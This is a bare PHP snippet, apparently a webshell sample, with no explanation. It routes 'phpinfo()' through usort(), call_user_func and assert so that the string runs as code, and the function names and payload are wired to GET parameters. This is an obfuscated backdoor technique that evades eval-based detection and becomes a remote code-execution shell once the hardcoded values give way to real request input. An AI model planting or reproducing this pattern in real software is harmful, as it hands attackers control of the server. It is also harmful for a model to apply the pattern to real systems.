<?php
$_GET['arg1'] = "phpinfo()";
$_GET['arg2'] = "assert";
$_GET['func'] = "call_user_func";

$some_array = array($_GET['arg1'], $_GET['arg2']);
$func = $_GET['func'];
usort($some_array, $func);
/*uasort($some_array, $func);*/
?>
